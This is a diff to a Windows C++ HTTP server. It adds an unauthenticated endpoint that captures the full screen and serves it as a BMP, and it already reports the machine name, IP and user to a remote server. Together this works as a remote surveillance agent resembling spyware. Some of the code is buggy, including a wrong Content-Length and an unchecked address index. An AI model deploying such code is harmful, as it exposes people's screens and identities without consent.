@@ -1,4 +1,5 @@
 #include <winsock2.h>
+#include <wingdi.h>
 #include <winuser.h>
 #include <ws2tcpip.h>
 #include <iostream>
@@ -7,6 +8,7 @@
 #include <thread>
 #include <mutex>
 #include <sstream>
+
 
 //#pragma comment(lib, "ws2_32.lib")
 
@@ -17,7 +19,7 @@ private:
     SOCKET clientSocket = INVALID_SOCKET;
     std::mutex clientMutex;
 		std::string machine, ip, user;
-    
+		//HBITMAP hBitmap;
     // Инициализация WinSock
     bool initWinSock() {
         int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -68,22 +70,28 @@ private:
         }
         
         request.assign(buffer.data(), bytesReceived);
-        LASTINPUTINFO last_input;
+        
+				LASTINPUTINFO last_input;
 				last_input.cbSize = sizeof(LASTINPUTINFO);
-				
 				bool ok = GetLastInputInfo(&last_input);
 				DWORD currentTime = GetTickCount();
 				DWORD duration = (currentTime - last_input.dwTime) / 1000;
 
         // Проверка запроса на /ping
         if (request.find("/ping") != std::string::npos && ok && duration < 10) {
-            std::string response = "HTTP/1.1 200 OK\r\nContent-Length: 38\r\n\r\npong" + machine + " " + ip + "" + user;
-            send(clientSocket, response.c_str(), response.length(), 0);
-        //} else if () {
+          std::string response = "HTTP/1.1 200 OK\r\nContent-Length: 34\r\n\r\n" + machine + " " + ip + "" + user;
+          send(clientSocket, response.c_str(), response.length(), 0);
+        } else if (request.find("/getimage") != std::string::npos) {
+					std::vector<char> img = getImage();
 					
+					std::string response = "HTTP/1.1 200 OK\r\nContent-Type: image/bmp\r\n\
+					Content-Transfer-Encoding: binary\r\n";
+					response += "Content-Length: " + std::to_string(img.size()) + "\r\n\r\n";
+					send(clientSocket, response.c_str(), response.size(), 0);
+					send(clientSocket, img.data(), img.size(), 0);
 				} else {
-            std::string response = "HTTP/1.1 404 Not Found\r\n\r\n";
-            send(clientSocket, response.c_str(), response.length(), 0);
+          std::string response = "HTTP/1.1 404 Not Found\r\n\r\n";
+          send(clientSocket, response.c_str(), response.length(), 0);
         }
         
         closesocket(clientSocket);
@@ -128,10 +136,10 @@ private:
 			
 			iResult = connect(ConnectSocket, (SOCKADDR *) & clientService, sizeof (clientService));
 			if (iResult == SOCKET_ERROR) {
-				std::cerr << "connect function failed with error: %ld\n" << WSAGetLastError() << std::endl;
+				std::cerr << "connect function failed with error: " << WSAGetLastError() << std::endl;
         iResult = closesocket(ConnectSocket);
         if (iResult == SOCKET_ERROR)
-					std::cerr << "closesocket function failed with error: %ld\n" << WSAGetLastError() << std::endl;
+					std::cerr << "closesocket function failed with error: " << WSAGetLastError() << std::endl;
         WSACleanup();
         return false;
 			}
@@ -144,13 +152,79 @@ private:
 			int bsent = send(ConnectSocket, request.c_str(), request.size(), 0);
 			iResult = closesocket(ConnectSocket);
 			if (iResult == SOCKET_ERROR) {
-				std::cout << "closesocket function failed with error: %ld\n" << WSAGetLastError() << std::endl;
+				std::cerr << "closesocket function failed with error: " << WSAGetLastError() << std::endl;
         WSACleanup();
         return false;
 			}
 			WSACleanup();
 			return true;
 		}
+		
+		
+		std::vector<char> getImage()  {
+			BITMAPINFO bmi;
+			int width  = GetSystemMetrics(SM_CXSCREEN);
+			int height = GetSystemMetrics(SM_CYSCREEN);
+			
+			bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+			bmi.bmiHeader.biWidth = width;
+			bmi.bmiHeader.biHeight = height;
+			bmi.bmiHeader.biPlanes = 1;
+			bmi.bmiHeader.biBitCount = 32;
+			bmi.bmiHeader.biCompression = BI_RGB;
+			
+			char *bitmapData = new char[width * height * 4]{0};
+			
+			HDC hdc = GetDC(NULL);
+			if(!hdc) return std::vector<char>();
+	
+			HDC memdc = CreateCompatibleDC(hdc);
+			if(!memdc) {
+				ReleaseDC(NULL, hdc);
+				return std::vector<char>();
+			}
+			HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, height);
+	
+			if (!hBitmap) {
+				ReleaseDC(nullptr, hdc);
+				return std::vector<char>();
+			}
+
+			HBITMAP oldbmp = (HBITMAP)SelectObject(memdc, hBitmap);
+			BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
+			GetDIBits(hdc, hBitmap, 0, bmi.bmiHeader.biHeight, bitmapData, &bmi, DIB_RGB_COLORS);
+	
+			SelectObject(memdc, oldbmp);
+			
+			DeleteDC(memdc);
+			ReleaseDC(nullptr, hdc);
+   
+			int infoSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + width * height * 4;
+			std::vector<char> ret;
+			ret.resize(infoSize);
+	
+			BITMAPFILEHEADER* bfh = reinterpret_cast<BITMAPFILEHEADER*>(ret.data());
+			bfh->bfType = 0x4d42; // 'BM'
+			bfh->bfSize = infoSize;
+			bfh->bfReserved1 = 0;
+			bfh->bfReserved2 = 0;
+			bfh->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+			
+			
+			BITMAPINFOHEADER* bm = reinterpret_cast<BITMAPINFOHEADER*>(ret.data() + sizeof(BITMAPFILEHEADER));
+			bm->biSize = sizeof(BITMAPINFOHEADER);
+			bm->biWidth = width;
+			bm->biHeight = height;
+			bm->biPlanes = 1;
+			bm->biBitCount = 32;
+			bm->biCompression = BI_RGB;
+			bm->biSizeImage = width * height * 4;
+			memcpy(ret.data() + bfh->bfOffBits, bitmapData, width * height * 4);
+			//std::vector<char> ret(bitmapData, bitmapData+ width * height * 4);
+			delete [] bitmapData;
+			return ret;
+		}
+
 public:
     HttpServer(int port) {
         if (!initWinSock()) {
@@ -170,12 +244,13 @@ public:
 				//get ip
 				hostent *host = gethostbyname(buffer);
 				ip = std::string(inet_ntoa(*(struct in_addr *)*host->h_addr_list));
+				ip = std::string(inet_ntoa(*(struct in_addr *)host->h_addr_list[2]));
 				// get user
 				DWORD username_len = 1024;
 				GetUserName(buffer, &username_len);
 				user = std::string(buffer);
+				
 				std::string m = "{\"domain\":\"test\",\"mashine\":\"" + machine + "\",\"ip\":\"" + ip + "\",\"user\":\"" + user + "\"}";
-
 				if (!sendMessage(m)) {
 					return;
 				}
